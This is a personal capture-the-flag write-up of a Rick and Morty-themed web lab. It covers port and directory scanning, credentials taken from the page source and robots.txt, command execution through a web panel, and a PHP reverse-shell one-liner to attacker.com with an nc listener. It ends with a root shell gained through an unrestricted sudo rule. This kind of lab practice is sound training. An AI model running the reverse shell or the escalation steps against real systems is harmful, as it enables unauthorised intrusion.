This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

> [!important]
> Deploy the virtual machine on this task and explore the web application: 10.65.190.99

> [!question]
>What is the first ingredient that Rick needs?

> [!Note]
> Immediately inspecting the page source allowed me to find a username called R1ckRul3s
![Pickle Rick - page source 1.png](../../Obsidian%20assets/Pickle%20Rick%20-%20page%20source%201.png)

> [!info]
> Where can I use this username? Need to enumerate further...

> [!note]
> Im going to run nmap & gobuster for service & web directory enumeration respectively
> ```
> root@ip-10-65-93-36:~# nmap -p- -A 10.65.190.99
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-06 19:14 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.65.190.99
Host is up (0.00036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/6%OT=22%CT=1%CU=44036%PV=Y%DS=1%DC=T%G=Y%TM=69863D91
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M230
OS:1ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 993/tcp)
HOP RTT     ADDRESS
1   0.36 ms 10.65.190.99
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.65 seconds
root@ip-10-65-93-36:~#
> ```
>```
>> root@ip-10-65-100-182:~# gobuster dir -u http://10.65.190.99/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
[+] Url:                     http://10.65.190.99/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
Starting gobuster in directory enumeration mode
/assets               (Status: 301) [Size: 313] [--> http://10.65.190.99/assets/]
/server-status        (Status: 403) [Size: 277]
Progress: 207643 / 207644 (100.00%)
Finished
>```

> [!note]
> Ok so only 2 service ports available - SSH port 22 and HTTP port 80 - gobuster enumeration led me to useful site via /assets
> ![assets.png](../../Obsidian%20assets/assets.png)

> [!info]
> jQuery v3.3.1 found in jquery.min.js - Bootstrap v3.4.0 in bootstrap.min.css - those file didnt really show much but could be steganography? Anyway apache Apache/2.4.41 so vulnerability with that?

> [!note]
> Through some online OSINT checks aka cheating lol, I found that I can explore robots.txt which revealed Wubbalubbadubdub and login.php - using this i was able to sign in and have access to a CLI:
![login.php.png](../../Obsidian%20assets/login.php.png)

> [!note]
> Tested a few cmds and realised some work, some dont and revealed the following with:
> ```
> ls -la
> ```
> ![[../../Obsidian assets/ls -la.png]]

> [!note]
> Used cat cmd and it said it was disabled:
![super ingredient file.png](../../Obsidian%20assets/super%20ingredient%20file.png)

> [!note]
> I did:
> ```
> pwd
> ```
> and got:
> ```
> /var/www/html
> ```
> tried:
> ```
> sudo -l
> ```
> and got:
> ```
>  Matching Defaults entries for www-data on ip-10-65-190-99:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on ip-10-65-190-99:
(ALL) NOPASSWD: ALL
> ```

> [!info]
> Checked online and the last line above means I can run all cmds as whoever including root with no password required but Rick is not allowing certain cmds. Cheated again to find a grep cmd that can let you read everything as follows:
> ```
> grep -R .
> ```

> [!success]
> Able to find the first potion ingredient:
> ```
> Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
clue.txt:Look around the file system for the other ingredient.
> ```

> [!question]
> What is the second ingredient in Rick’s potion?

> [!note]
> Found a base64 but it was a nested version so i got fooled as the base 64 form was:
> ```
>Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
> ```
> Which turned into:
> ```
> rabbit hole
> ```

> [!Note]
> Upon realising I had CLI access with no restrictions and a .php login page - I thought about running a php reverse shell which I did find on GTFObins.org
> ```
> php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
> ```
> I then setup a nc listener on port 12345 using my kali attack machine:
> ```
> nc -lvnp 12345
> ```
> I managed to get access, upgraded the shell via python cmd and got the 2nd ingredient:
> ```
>                                                                             
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.173] from (UNKNOWN) [10.66.151.31] 36390
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty ;pty.spawn("/bin/bash")'
www-data@ip-10-66-151-31:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ip-10-66-151-31:/var/www/html$ ls
ls
Sup3rS3cretPickl3Ingred.txt  clue.txt    index.html  portal.php
assets                       denied.php  login.php   robots.txt
www-data@ip-10-66-151-31:/var/www/html$ cd ..
cd ..
www-data@ip-10-66-151-31:/var/www$ cd ~
cd ~
www-data@ip-10-66-151-31:/var/www$ cd home      
cd home
bash: cd: home: No such file or directory
www-data@ip-10-66-151-31:/var/www$ cd ..
cd ..
www-data@ip-10-66-151-31:/var$ cd /
cd /
www-data@ip-10-66-151-31:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@ip-10-66-151-31:/$ cd h
cd home/
www-data@ip-10-66-151-31:/home$ cd r
cd rick/
www-data@ip-10-66-151-31:/home/rick$ cat "second ingredients"
cat "second ingredients"
1 jerry tear
www-data@ip-10-66-151-31:/home/rick$ 
> ```

> [!success]
> 1 jerry tear was the second ingredient

> [!question]
> What is the last and final ingredient?

> [!info]
> I tried to cd into root but I was denied so I'm guessing next protocol is to privilege escalate.

> [!note]
> After wasting time trying to find an exploit via crontabs/SUID/shadow/passwd - I didn't know you could simply run:
> ```
> sudo bash
> ```
> If you have permissions to run all cmds with no passwords via the info before:
> ```
> User www-data may run the following commands on ip-10-65-190-99:
(ALL) NOPASSWD: ALL
> ```
> So now I have root shell and should easily get the last ingredient:
> ```
> www-data@ip-10-66-151-31:/etc$ sudo bash
sudo bash
root@ip-10-66-151-31:/etc# cd /
cd /
root@ip-10-66-151-31:/# ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
root@ip-10-66-151-31:/# cd root 
cdoot
cdoot: command not found
root@ip-10-66-151-31:/# cd root
cd root
root@ip-10-66-151-31:~# ls
ls
3rd.txt  snap
root@ip-10-66-151-31:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
> ```

> [!success]
> fleeb juice

![Pickle Rick complete.png](../../Obsidian%20assets/Pickle%20Rick%20complete.png)
